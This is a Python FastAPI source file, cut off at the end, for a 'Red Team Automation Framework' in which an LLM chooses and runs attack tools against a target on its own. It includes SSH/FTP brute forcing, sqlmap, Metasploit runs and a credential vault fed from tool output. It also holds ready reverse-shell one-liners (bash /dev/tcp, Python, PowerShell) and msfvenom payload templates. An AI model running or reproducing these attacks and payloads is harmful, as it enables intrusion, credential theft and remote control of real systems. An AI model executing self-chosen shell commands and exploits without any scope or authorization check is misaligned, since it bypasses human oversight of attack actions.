from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks, WebSocket, WebSocketDisconnect
from fastapi.responses import StreamingResponse
from starlette.middleware.cors import CORSMiddleware
import os
import logging
from pathlib import Path
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import httpx
import json
import re
import io
import asyncio
import time
from fpdf import FPDF

from config import config
import db as repo
import jobs

app = FastAPI(title="Red Team Automation Framework")
api_router = APIRouter(prefix="/api")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# In-memory state for real-time tracking
scan_progress: Dict[str, Dict[str, Any]] = {}
attack_trees: Dict[str, Dict[str, Any]] = {}
active_connections: Dict[str, List[WebSocket]] = {}

KIMI_API_KEY = config.kimi_api_key
KIMI_API_URL = "https://api.moonshot.ai/v1/chat/completions"

from modules.credential_vault import CredentialVault
from modules.session_manager import SessionManager

credential_vault = CredentialVault()
session_manager = SessionManager()


# =============================================================================
# TOOL CATALOG — All CLI-based, no RPC dependencies
# =============================================================================
RED_TEAM_TOOLS = {
    # Reconnaissance
    "nmap": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "nmap -sV -sC -A {target}", "desc": "Port scanner & service detection", "parser": "nmap"},
    "nmap_fast": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "nmap -sV --top-ports 100 {target}", "desc": "Fast top-100 port scan", "parser": "nmap"},
    "masscan": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "masscan -p1-65535 {target} --rate=1000", "desc": "Full port scan (fast)", "parser": "generic"},
    "subfinder": {"phase": "reconnaissance", "mitre": "T1590", "cmd": "subfinder -d {target} -silent", "desc": "Subdomain enumeration", "parser": "list"},
    "wafw00f": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "wafw00f {target}", "desc": "WAF detection", "parser": "waf"},
    "whatweb": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "whatweb {target}", "desc": "Web technology fingerprint", "parser": "generic"},
    # Web Scanning
    "nikto": {"phase": "initial_access", "mitre": "T1190", "cmd": "nikto -h {target} -Tuning 123bde -maxtime 120s", "desc": "Web vulnerability scanner", "parser": "nikto"},
    "gobuster": {"phase": "initial_access", "mitre": "T1594", "cmd": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q -t 20", "desc": "Directory bruteforce", "parser": "list"},
    "nuclei": {"phase": "initial_access", "mitre": "T1190", "cmd": "nuclei -u {target} -severity critical,high,medium -silent -jsonl", "desc": "Vulnerability scanner (8000+ templates)", "parser": "nuclei"},
    "nuclei_full": {"phase": "initial_access", "mitre": "T1190", "cmd": "nuclei -u {target} -silent -jsonl", "desc": "Full Nuclei scan (all severities)", "parser": "nuclei"},
    # Exploitation
    "sqlmap": {"phase": "initial_access", "mitre": "T1190", "cmd": "sqlmap -u '{target}' --batch --random-agent --level 2", "desc": "SQL injection scanner", "parser": "generic"},
    "hydra_ssh": {"phase": "credential_access", "mitre": "T1110", "cmd": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {target} ssh -t 4 -f", "desc": "SSH brute force", "parser": "generic"},
    "hydra_ftp": {"phase": "credential_access", "mitre": "T1110", "cmd": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {target} ftp -t 4 -f", "desc": "FTP brute force", "parser": "generic"},
    # Metasploit CLI (no RPC needed)
    "msfconsole": {"phase": "exploitation", "mitre": "T1203", "cmd": "msfconsole -q -x '{target}'", "desc": "Metasploit CLI (direct commands)", "parser": "generic"},
    "msfvenom": {"phase": "resource_development", "mitre": "T1587", "cmd": "msfvenom {target}", "desc": "Payload generator", "parser": "generic"},
    # SSL/Network
    "sslscan": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "sslscan {target}", "desc": "SSL/TLS analysis", "parser": "generic"},
}

MITRE_TACTICS = {
    "reconnaissance": {"id": "TA0043", "name": "Reconnaissance", "description": "Gathering information"},
    "resource_development": {"id": "TA0042", "name": "Resource Development", "description": "Establishing resources"},
    "initial_access": {"id": "TA0001", "name": "Initial Access", "description": "Gaining foothold"},
    "execution": {"id": "TA0002", "name": "Execution", "description": "Running code"},
    "persistence": {"id": "TA0003", "name": "Persistence", "description": "Maintaining access"},
    "privilege_escalation": {"id": "TA0004", "name": "Privilege Escalation", "description": "Higher permissions"},
    "defense_evasion": {"id": "TA0005", "name": "Defense Evasion", "description": "Avoiding detection"},
    "credential_access": {"id": "TA0006", "name": "Credential Access", "description": "Stealing creds"},
    "discovery": {"id": "TA0007", "name": "Discovery", "description": "Understanding environment"},
    "lateral_movement": {"id": "TA0008", "name": "Lateral Movement", "description": "Moving through env"},
    "collection": {"id": "TA0009", "name": "Collection", "description": "Gathering data"},
    "command_and_control": {"id": "TA0011", "name": "Command and Control", "description": "C2 comms"},
    "exfiltration": {"id": "TA0010", "name": "Exfiltration", "description": "Stealing data"},
    "impact": {"id": "TA0040", "name": "Impact", "description": "Disrupt/destroy"},
}


# =============================================================================
# OUTPUT PARSERS
# =============================================================================
def parse_nmap_output(output: str) -> Dict[str, Any]:
    ports = []
    os_info = None
    for line in output.split('\n'):
        if '/tcp' in line or '/udp' in line:
            parts = line.split()
            if len(parts) >= 3:
                ports.append({"port": parts[0], "state": parts[1], "service": ' '.join(parts[2:])})
        if 'OS details:' in line:
            os_info = line.split('OS details:')[1].strip()
    return {"ports": ports, "os_detection": os_info, "raw": output}

def parse_waf_output(output: str) -> Dict[str, Any]:
    waf = None
    if "is behind" in output.lower():
        match = re.search(r'is behind (.+?)(?:\n|$)', output, re.IGNORECASE)
        if match:
            waf = match.group(1).strip()
    elif "no waf" in output.lower():
        waf = "None Detected"
    return {"waf": waf, "raw": output}

def parse_nikto_output(output: str) -> Dict[str, Any]:
    vulns = []
    for line in output.split('\n'):
        if line.strip().startswith('+'):
            severity = "medium"
            if any(x in line.lower() for x in ['critical', 'rce', 'injection', 'remote code']):
                severity = "critical"
            elif any(x in line.lower() for x in ['xss', 'sql', 'traversal', 'upload']):
                severity = "high"
            elif any(x in line.lower() for x in ['info', 'server header', 'x-frame']):
                severity = "low"
            vulns.append({"finding": line.strip(), "severity": severity})
    return {"vulnerabilities": vulns, "raw": output}

def parse_nuclei_output(output: str) -> Dict[str, Any]:
    findings = []
    for line in output.strip().split('\n'):
        if not line.strip():
            continue
        try:
            data = json.loads(line)
            findings.append({
                "template_id": data.get("template-id", ""),
                "name": data.get("info", {}).get("name", ""),
                "severity": data.get("info", {}).get("severity", "unknown"),
                "matched_at": data.get("matched-at", ""),
                "type": data.get("type", ""),
                "description": data.get("info", {}).get("description", "")[:200],
            })
        except json.JSONDecodeError:
            if line.strip() and not line.startswith('['):
                findings.append({"finding": line.strip(), "severity": "info"})
    critical = len([f for f in findings if f.get("severity") == "critical"])
    high = len([f for f in findings if f.get("severity") == "high"])
    medium = len([f for f in findings if f.get("severity") == "medium"])
    return {"findings": findings, "summary": {"critical": critical, "high": high, "medium": medium, "total": len(findings)}, "raw": output}

def parse_list_output(output: str) -> Dict[str, Any]:
    items = [line.strip() for line in output.strip().split('\n') if line.strip()]
    return {"items": items, "count": len(items), "raw": output}

PARSERS = {
    "nmap": parse_nmap_output,
    "waf": parse_waf_output,
    "nikto": parse_nikto_output,
    "nuclei": parse_nuclei_output,
    "list": parse_list_output,
    "generic": lambda o: {"output": o},
}


# =============================================================================
# ASYNC TOOL RUNNER
# =============================================================================
async def run_tool(tool_id: str, target: str, custom_cmd: str = None) -> Dict[str, Any]:
    tool = RED_TEAM_TOOLS.get(tool_id)
    if not tool and not custom_cmd:
        return {"error": f"Unknown tool: {tool_id}"}
    try:
        if custom_cmd:
            cmd = custom_cmd
            parser_name = "generic"
        else:
            cmd = tool["cmd"].format(target=target)
            parser_name = tool.get("parser", "generic")
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=300)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return {"error": f"{tool_id} timed out (300s)", "tool": tool_id}
        output = (stdout.decode(errors='replace') if stdout else '') + (stderr.decode(errors='replace') if stderr else '')
        parser = PARSERS.get(parser_name, PARSERS["generic"])
        result = parser(output)
        result["tool"] = tool_id
        result["command"] = cmd
        result["exit_code"] = proc.returncode
        return result
    except FileNotFoundError:
        return {"simulated": True, "tool": tool_id, "command": cmd if custom_cmd else tool["cmd"].format(target=target), "error": f"{tool_id} not installed"}
    except Exception as e:
        return {"error": str(e), "tool": tool_id}


async def run_msfconsole(commands: str, target: str = "", timeout: int = 120) -> Dict[str, Any]:
    """Run msfconsole with direct commands (no RPC)."""
    rc_content = commands + "\nexit\n"
    rc_file = f"/tmp/msf_{uuid.uuid4().hex[:8]}.rc"
    try:
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        proc = await asyncio.create_subprocess_exec(
            "msfconsole", "-q", "-r", rc_file,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return {"success": False, "error": f"Timeout ({timeout}s)", "commands": commands}
        output = (stdout.decode(errors='replace') if stdout else '') + (stderr.decode(errors='replace') if stderr else '')
        success = "session" in output.lower() and "opened" in output.lower()
        return {"success": success, "session_opened": success, "output": output, "commands": commands}
    except FileNotFoundError:
        return {"success": False, "error": "msfconsole not installed", "commands": commands}
    except Exception as e:
        return {"success": False, "error": str(e), "commands": commands}
    finally:
        try:
            os.remove(rc_file)
        except OSError:
            pass


# =============================================================================
# AI-DRIVEN TACTICAL ENGINE
# =============================================================================
async def ai_decide_next_action(target: str, results_so_far: Dict, executed_tools: list, available_tools: Dict, scan_context: Dict = None) -> Dict[str, Any]:
    """Ask Kimi AI to decide the next tool/action based on results so far."""
    if not KIMI_API_KEY:
        return _fallback_decision(results_so_far, executed_tools, available_tools)

    tools_desc = "\n".join([f"- {tid}: {t['desc']} (fase: {t['phase']})" for tid, t in available_tools.items() if tid not in executed_tools])

    if not tools_desc.strip():
        return {"action": "done", "reasoning": "Todas las herramientas disponibles ya fueron ejecutadas", "source": "exhausted"}

    results_summary = {}
    for tool_id, result in results_so_far.items():
        if isinstance(result, dict):
            summary = {}
            if result.get("ports"):
                summary["ports"] = result["ports"][:15]
            if result.get("waf"):
                summary["waf"] = result["waf"]
            if result.get("vulnerabilities"):
                summary["vulns"] = result["vulnerabilities"][:10]
            if result.get("findings"):
                summary["findings"] = result["findings"][:10]
            if result.get("items"):
                summary["items"] = result["items"][:20]
            if result.get("os_detection"):
                summary["os"] = result["os_detection"]
            if result.get("output"):
                summary["output"] = result["output"][:500]
            if result.get("error"):
                summary["error"] = result["error"]
            results_summary[tool_id] = summary

    prompt = f"""Eres un Red Team Operator experto. Decide el SIGUIENTE paso del escaneo.

TARGET: {target}

HERRAMIENTAS YA EJECUTADAS (NO repetir ninguna): {', '.join(executed_tools) if executed_tools else 'Ninguna'}

RESULTADOS:
{json.dumps(results_summary, indent=2, default=str)[:4000]}

HERRAMIENTAS DISPONIBLES (elige SOLO de esta lista):
{tools_desc}

Responde SOLO JSON valido:
{{
  "action": "run_tool" | "run_msf" | "run_custom" | "done",
  "tool_id": "nombre_exacto_de_la_lista_disponible",
  "custom_cmd": "solo si action=run_custom",
  "msf_commands": "solo si action=run_msf",
  "reasoning": "1 linea en español",
  "severity_assessment": "critical|high|medium|low|info",
  "findings_summary": "resumen breve"
}}

REGLAS ESTRICTAS:
1. PROHIBIDO repetir herramientas de la lista "YA EJECUTADAS"
2. Sigue la secuencia logica: Recon -> Enum -> Vuln Scan -> Exploit
3. Si nmap ya corrio, NO uses nmap_fast ni viceversa (misma funcion)
4. Si detectaste WAF, evita herramientas agresivas
5. Si ya tienes 5+ herramientas ejecutadas y suficiente info, responde "done"
6. Elige SOLO tool_id que aparezca en HERRAMIENTAS DISPONIBLES"""

    try:
        async with httpx.AsyncClient(timeout=30.0) as http:
            response = await http.post(
                KIMI_API_URL,
                headers={"Authorization": f"Bearer {KIMI_API_KEY}", "Content-Type": "application/json"},
                json={"model": "kimi-k2-0711-preview", "messages": [
                    {"role": "system", "content": "Eres un Red Team operator. Responde SOLO JSON valido, sin markdown ni texto extra."},
                    {"role": "user", "content": prompt}
                ], "temperature": 0.2, "max_tokens": 1000}
            )
            if response.status_code == 200:
                data = response.json()
                ai_text = data["choices"][0]["message"]["content"].strip()
                # Clean markdown fences if present
                if ai_text.startswith("```"):
                    ai_text = re.sub(r'^```(?:json)?\s*', '', ai_text)
                    ai_text = re.sub(r'\s*```$', '', ai_text)
                decision = json.loads(ai_text)
                decision["source"] = "ai"
                return decision
            else:
                logger.warning(f"AI API error: {response.status_code}")
                return _fallback_decision(results_so_far, executed_tools, available_tools)
    except (json.JSONDecodeError, Exception) as e:
        logger.warning(f"AI decision error: {e}")
        return _fallback_decision(results_so_far, executed_tools, available_tools)


def _fallback_decision(results_so_far: Dict, executed_tools: list, available_tools: Dict) -> Dict[str, Any]:
    """Rule-based fallback when AI is unavailable."""
    # Priority order
    priority = ["nmap", "wafw00f", "whatweb", "nuclei", "nikto", "gobuster", "subfinder", "hydra_ssh"]

    has_waf = any(
        isinstance(r, dict) and r.get("waf") and r["waf"] != "None Detected"
        for r in results_so_far.values()
    )
    aggressive = {"nikto", "sqlmap", "hydra_ssh", "hydra_ftp", "nuclei_full"}

    for tool_id in priority:
        if tool_id not in executed_tools and tool_id in available_tools:
            if has_waf and tool_id in aggressive:
                continue
            return {
                "action": "run_tool", "tool_id": tool_id,
                "reasoning": f"Fallback: ejecutando {tool_id} (AI no disponible)",
                "source": "fallback"
            }
    return {"action": "done", "reasoning": "Todas las herramientas prioritarias ejecutadas", "source": "fallback"}


async def ai_final_analysis(target: str, all_results: Dict, timeline: list) -> Dict[str, Any]:
    """AI generates final report and recommendations."""
    if not KIMI_API_KEY:
        return {"analysis": "AI no configurada. Revisa los resultados manualmente.", "recommendations": [], "risk_level": "unknown"}

    results_summary = {}
    for tool_id, result in all_results.items():
        if isinstance(result, dict):
            s = {}
            if result.get("ports"):
                s["ports"] = result["ports"][:15]
            if result.get("waf"):
                s["waf"] = result["waf"]
            if result.get("vulnerabilities"):
                s["vulns"] = [v.get("finding", "")[:100] for v in result["vulnerabilities"][:8]]
            if result.get("findings"):
                s["findings"] = [{"name": f.get("name",""), "severity": f.get("severity","")} for f in result["findings"][:10]]
            if result.get("items"):
                s["items"] = result["items"][:15]
            if result.get("error"):
                s["error"] = result["error"]
            if s:
                results_summary[tool_id] = s

    prompt = f"""Eres un Red Team Operator experto. Genera un REPORTE FINAL de la operacion contra {target}.

RESULTADOS:
{json.dumps(results_summary, indent=2, default=str)[:5000]}

Responde en español con:
1. RESUMEN EJECUTIVO (2-3 oraciones)
2. VULNERABILIDADES ENCONTRADAS (lista con severidad)
3. VECTOR DE ATAQUE RECOMENDADO (paso a paso)
4. NIVEL DE RIESGO GENERAL (critico/alto/medio/bajo)
5. RECOMENDACIONES DE REMEDIACION (para el blue team)
6. PROXIMOS PASOS (que harias despues como red teamer)

Se directo y tactico."""

    try:
        async with httpx.AsyncClient(timeout=60.0) as http:
            response = await http.post(
                KIMI_API_URL,
                headers={"Authorization": f"Bearer {KIMI_API_KEY}", "Content-Type": "application/json"},
                json={"model": "kimi-k2-0711-preview", "messages": [
                    {"role": "system", "content": "Eres un Red Team operator experto. Responde en español."},
                    {"role": "user", "content": prompt}
                ], "temperature": 0.3, "max_tokens": 4000}
            )
            if response.status_code == 200:
                data = response.json()
                analysis = data["choices"][0]["message"]["content"]
                return {"analysis": analysis, "source": "kimi_k2"}
            return {"analysis": f"API Error: {response.status_code}", "source": "error"}
    except Exception as e:
        return {"analysis": f"Error: {str(e)}", "source": "error"}


# =============================================================================
# AI-DRIVEN SCAN JOB HANDLER
# =============================================================================
SCAN_LIMITS = {"max_tools": 12, "max_time_seconds": 900, "tool_timeout": 300}

async def scan_job_handler(job_id: str, target: str, params: Dict):
    """AI-driven adaptive scan — the AI decides each step."""
    scan_id = params.get("scan_id", job_id)
    start_time = time.time()

    scan_progress[scan_id] = {
        "status": "running", "current_tool": None, "progress": 0,
        "results": {}, "ai_decisions": [], "ai_analysis": None,
        "timeline": [], "vault_summary": {}, "adaptive_log": []
    }

    credential_vault.update_context(scan_id, target=target)
    executed_tools = []
    tool_count = 0
    consecutive_errors = 0

    def log_timeline(event_type, detail, data=None):
        scan_progress[scan_id]["timeline"].append({
            "time": datetime.now(timezone.utc).isoformat(),
            "elapsed": round(time.time() - start_time, 1),
            "type": event_type, "detail": detail, "data": data or {}
        })

    try:
        log_timeline("start", f"AI-driven scan initiated: {target}")
        await repo.job_log(job_id, "info", f"Scan started: {target}", module="scan")
        await repo.scan_create(scan_id, job_id, target, params.get("phases", []), [])

        while tool_count < SCAN_LIMITS["max_tools"]:
            elapsed = time.time() - start_time
            if elapsed > SCAN_LIMITS["max_time_seconds"]:
                log_timeline("timeout", f"Time limit ({int(elapsed)}s)")
                break
            if consecutive_errors >= 3:
                log_timeline("error_limit", "3 consecutive errors, stopping")
                break
            if scan_progress.get(scan_id, {}).get("status") == "aborted":
                log_timeline("aborted", "User aborted")
                break

            # Ask AI what to do next
            progress = int((tool_count / SCAN_LIMITS["max_tools"]) * 80)
            scan_progress[scan_id]["progress"] = progress
            scan_progress[scan_id]["current_tool"] = "ai_thinking"
            await repo.job_update(job_id, progress=progress, current_step="ai_deciding")
            await repo.job_log(job_id, "info", "AI deciding next action...", module="ai")

            decision = await ai_decide_next_action(
                target, scan_progress[scan_id]["results"],
                executed_tools, RED_TEAM_TOOLS,
                {"elapsed": int(elapsed), "tool_count": tool_count, "vault": credential_vault.get_context(scan_id)}
            )
            scan_progress[scan_id]["ai_decisions"].append(decision)
            log_timeline("ai_decision", decision.get("reasoning", ""), {"decision": decision})

            if decision.get("action") == "done":
                await repo.job_log(job_id, "info", f"AI: Scan complete — {decision.get('reasoning', '')}", module="ai")
                break

            # Execute the AI's choice
            tool_id = decision.get("tool_id", "unknown")
            action = decision.get("action", "")

            # ANTI-LOOP: Skip if AI suggests already-executed tool
            if action == "run_tool" and tool_id in executed_tools:
                await repo.job_log(job_id, "warning", f"AI repeated {tool_id}, forcing fallback", module="ai")
                decision = _fallback_decision(scan_progress[scan_id]["results"], executed_tools, RED_TEAM_TOOLS)
                if decision.get("action") == "done":
                    break
                tool_id = decision.get("tool_id", "unknown")
                action = decision.get("action", "")

            # ANTI-LOOP: Skip nmap_fast if nmap ran and vice versa
            nmap_variants = {"nmap", "nmap_fast", "masscan"}
            if tool_id in nmap_variants and any(t in nmap_variants for t in executed_tools):
                await repo.job_log(job_id, "warning", f"Skipping duplicate scan type: {tool_id}", module="ai")
                executed_tools.append(tool_id)
                continue

            scan_progress[scan_id]["current_tool"] = tool_id
            await repo.job_update(job_id, progress=progress, current_step=tool_id)
            log_timeline("tool_start", f"[AI] Running: {tool_id} — {decision.get('reasoning', '')}")
            await repo.job_log(job_id, "info", f"AI chose: {tool_id} — {decision.get('reasoning', '')}", module="scan")

            if action == "run_tool" and tool_id in RED_TEAM_TOOLS:
                result = await run_tool(tool_id, target)
            elif action == "run_msf":
                msf_cmds = decision.get("msf_commands", "")
                result = await run_msfconsole(msf_cmds, target)
                tool_id = f"msf_{tool_count}"
            elif action == "run_custom":
                custom_cmd = decision.get("custom_cmd", "")
                result = await run_tool(tool_id, target, custom_cmd=custom_cmd)
                tool_id = f"custom_{tool_count}"
            else:
                result = {"error": f"Unknown action: {action}"}

            scan_progress[scan_id]["results"][tool_id] = result
            executed_tools.append(tool_id)
            tool_count += 1

            if result.get("error"):
                consecutive_errors += 1
                log_timeline("tool_error", f"{tool_id}: {result['error']}")
                await repo.job_log(job_id, "error", f"{tool_id}: {result['error']}", module="scan")
            else:
                consecutive_errors = 0
                log_timeline("tool_complete", f"{tool_id} completed")
                await repo.job_log(job_id, "info", f"{tool_id} completed", module="scan")

            # Parse credentials from output
            output_text = ""
            if isinstance(result, dict):
                output_text = result.get("output", result.get("raw", ""))
            if isinstance(output_text, str) and output_text:
                found_creds = CredentialVault.parse_credentials_from_output(output_text, tool_id, target)
                for cred in found_creds:
                    credential_vault.add_credential(scan_id, cred)
                    log_timeline("credential", f"Found: {cred.get('type')} - {cred.get('username','?')}")
                os_info = CredentialVault.detect_os_from_output(output_text)
                if os_info:
                    credential_vault.update_context(scan_id, os_info=os_info)

            await asyncio.sleep(1)

        # Final AI analysis
        scan_progress[scan_id]["current_tool"] = "ai_analyzing"
        scan_progress[scan_id]["progress"] = 90
        await repo.job_update(job_id, progress=90, current_step="ai_analysis")
        await repo.job_log(job_id, "info", "AI generating final analysis...", module="ai")

        ai_result = await ai_final_analysis(target, scan_progress[scan_id]["results"], scan_progress[scan_id]["timeline"])
        scan_progress[scan_id]["ai_analysis"] = ai_result.get("analysis", "")

        # Build attack tree from results
        attack_tree = build_attack_tree(scan_id, target, scan_progress[scan_id]["results"], scan_progress[scan_id]["ai_decisions"])
        scan_progress[scan_id]["attack_tree"] = attack_tree
        attack_trees[scan_id] = attack_tree

        scan_progress[scan_id]["status"] = "completed"
        scan_progress[scan_id]["progress"] = 100
        scan_progress[scan_id]["vault_summary"] = credential_vault.get_vault_summary(scan_id)
        await credential_vault.save_to_db(scan_id)

        log_timeline("complete", f"Scan done. Tools: {tool_count}, AI decisions: {len(scan_progress[scan_id]['ai_decisions'])}")

        await repo.scan_update(scan_id,
            status="completed", results=scan_progress[scan_id]["results"],
            ai_analysis=json.dumps({"analysis": scan_progress[scan_id]["ai_analysis"]}),
            attack_tree=attack_tree, vault=scan_progress[scan_id]["vault_summary"],
            timeline=scan_progress[scan_id]["timeline"], progress=100,
            finished_at=datetime.now(timezone.utc).isoformat()
        )
        await repo.job_log(job_id, "info", "Scan completed", module="scan")
        return {"scan_id": scan_id, "status": "completed", "tool_count": tool_count}

    except Exception as e:
        import traceback
        logger.error(f"Scan error: {e}\n{traceback.format_exc()}")
        scan_progress[scan_id]["status"] = "error"
        scan_progress[scan_id]["error"] = str(e)
        log_timeline("error", str(e))
        await repo.scan_update(scan_id, status="error")
        raise


def build_attack_tree(scan_id: str, target: str, results: Dict, ai_decisions: list) -> Dict[str, Any]:
    tree = {
        "scan_id": scan_id,
        "root": {"id": "root", "type": "target", "name": target, "status": "testing", "children": []},
        "nodes": {}
    }
    node_id = 0
    for tool_id, result in results.items():
        node_id += 1
        nid = f"tool_{node_id}"
        tool_info = RED_TEAM_TOOLS.get(tool_id, {})
        has_error = result.get("error")
        has_findings = bool(result.get("vulnerabilities") or result.get("findings") or result.get("ports"))
        status = "failed" if has_error else ("success" if has_findings else "completed")
        severity = "info"
        if result.get("findings"):
            severities = [f.get("severity", "info") for f in result["findings"]]
            if "critical" in severities:
                severity = "critical"
            elif "high" in severities:
                severity = "high"
        elif result.get("vulnerabilities"):
            severities = [v.get("severity", "info") for v in result["vulnerabilities"]]
            if "critical" in severities:
                severity = "critical"
            elif "high" in severities:
                severity = "high"
        tree["nodes"][nid] = {
            "id": nid, "parent_id": "root", "type": "tool",
            "name": tool_id.upper(), "description": tool_info.get('desc', ''),
            "status": status, "severity": severity,
            "mitre": tool_info.get('mitre'), "data": result, "children": []
        }
        tree["root"]["children"].append(nid)
        # Add sub-nodes for critical findings
        if result.get("findings"):
            for finding in result["findings"][:5]:
                if finding.get("severity") in ("critical", "high"):
                    node_id += 1
                    fid = f"finding_{node_id}"
                    tree["nodes"][fid] = {
                        "id": fid, "parent_id": nid, "type": "vulnerability",
                        "name": finding.get("name", finding.get("template_id", "Finding")),
                        "description": finding.get("matched_at", finding.get("description", "")),
                        "status": "pending", "severity": finding.get("severity", "high"),
                        "data": finding, "children": []
                    }
                    tree["nodes"][nid]["children"].append(fid)
        if result.get("vulnerabilities"):
            for vuln in result["vulnerabilities"][:5]:
                if vuln.get("severity") in ("critical", "high"):
                    node_id += 1
                    vid = f"vuln_{node_id}"
                    tree["nodes"][vid] = {
                        "id": vid, "parent_id": nid, "type": "vulnerability",
                        "name": vuln.get("finding", "Vulnerability")[:80],
                        "description": "", "status": "pending",
                        "severity": vuln.get("severity", "high"),
                        "data": vuln, "children": []
                    }
                    tree["nodes"][nid]["children"].append(vid)
    return tree


# =============================================================================
# MODELS
# =============================================================================
class ScanCreate(BaseModel):
    target: str
    scan_phases: List[str] = ["reconnaissance", "initial_access"]
    tools: List[str] = []

class UpdateNodeStatus(BaseModel):
    status: str
    notes: Optional[str] = None


# =============================================================================
# GLOBAL CONFIG (SQLite-backed)
# =============================================================================
global_config: Dict[str, Any] = {
    "listener_ip": "", "listener_port": 4444, "c2_protocol": "tcp",
    "operator_name": "operator", "stealth_mode": False, "auto_lhost": True,
}

async def load_global_config():
    global global_config
    stored = await repo.config_get("operator_config")
    if stored and isinstance(stored, dict):
        global_config.update(stored)
    env_ip = os.environ.get("LISTENER_IP", "")
    if env_ip and not global_config.get("listener_ip"):
        global_config["listener_ip"] = env_ip
        await repo.config_set("operator_config", global_config)

def get_effective_lhost() -> str:
    return global_config.get("listener_ip", "") or ""


# =============================================================================
# PAYLOAD TEMPLATES
# =============================================================================
PAYLOAD_TEMPLATES = {
    "windows/meterpreter/reverse_tcp": {"name": "Windows Meterpreter Reverse TCP", "platform": "windows", "arch": "x64", "type": "staged", "generator": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}", "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit -j\"", "output_ext": "exe", "description": "Staged Meterpreter."},
    "windows/meterpreter/reverse_https": {"name": "Windows Meterpreter HTTPS", "platform": "windows", "arch": "x64", "type": "staged", "generator": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f exe -o {output}", "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {lhost}; set LPORT {lport}; exploit -j\"", "output_ext": "exe", "description": "Encrypted HTTPS."},
    "windows/shell_reverse_tcp": {"name": "Windows Shell TCP", "platform": "windows", "arch": "x64", "type": "stageless", "generator": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}", "handler": "nc -lvnp {lport}", "output_ext": "exe", "description": "Simple CMD shell."},
    "linux/shell_reverse_tcp": {"name": "Linux Shell TCP", "platform": "linux", "arch": "x64", "type": "stageless", "generator": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}", "handler": "nc -lvnp {lport}", "output_ext": "elf", "description": "ELF reverse shell."},
    "linux/meterpreter/reverse_tcp": {"name": "Linux Meterpreter TCP", "platform": "linux", "arch": "x64", "type": "staged", "generator": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}", "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit -j\"", "output_ext": "elf", "description": "Linux Meterpreter."},
    "php/reverse_php": {"name": "PHP Reverse Shell", "platform": "php", "arch": "any", "type": "stageless", "generator": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o {output}", "handler": "nc -lvnp {lport}", "output_ext": "php", "description": "PHP shell for upload vulns."},
    "bash_reverse": {"name": "Bash Reverse Shell", "platform": "linux", "arch": "any", "type": "oneliner", "generator": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1", "handler": "nc -lvnp {lport}", "output_ext": None, "description": "No binary needed."},
    "python_reverse": {"name": "Python Reverse Shell", "platform": "any", "arch": "any", "type": "oneliner", "generator": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "handler": "nc -lvnp {lport}", "output_ext": None, "description": "Cross-platform."},
    "powershell_reverse": {"name": "PowerShell Reverse", "platform": "windows", "arch": "any", "type": "oneliner", "generator": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length)}}\"", "handler": "nc -lvnp {lport}", "output_ext": None, "description": "In-memory. No binary."},
}


def sanitize_for_pdf(text: str) -> str:
    try:
        return text.encode('latin-1', errors='replace').decode('latin-1')
    except Exception:
        return text.encode('ascii', errors='replace').decode('ascii')


# =============================================================================
# API ROUTES
# =============================================================================

@api_router.get("/")
async def root():
    return {"message": "Red Team Automation Framework", "version": "7.0.0-ai", "architecture": "local-first", "database": "sqlite", "engine": "ai-driven"}


@api_router.get("/health")
async def health():
    db_ok = await repo.is_healthy()
    # Check which tools are available
    tool_status = {}
    for tool_name in ["nmap", "nikto", "nuclei", "sqlmap", "hydra", "msfconsole", "msfvenom", "gobuster"]:
        try:
            proc = await asyncio.create_subprocess_exec("which", tool_name, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            await asyncio.wait_for(proc.communicate(), timeout=2)
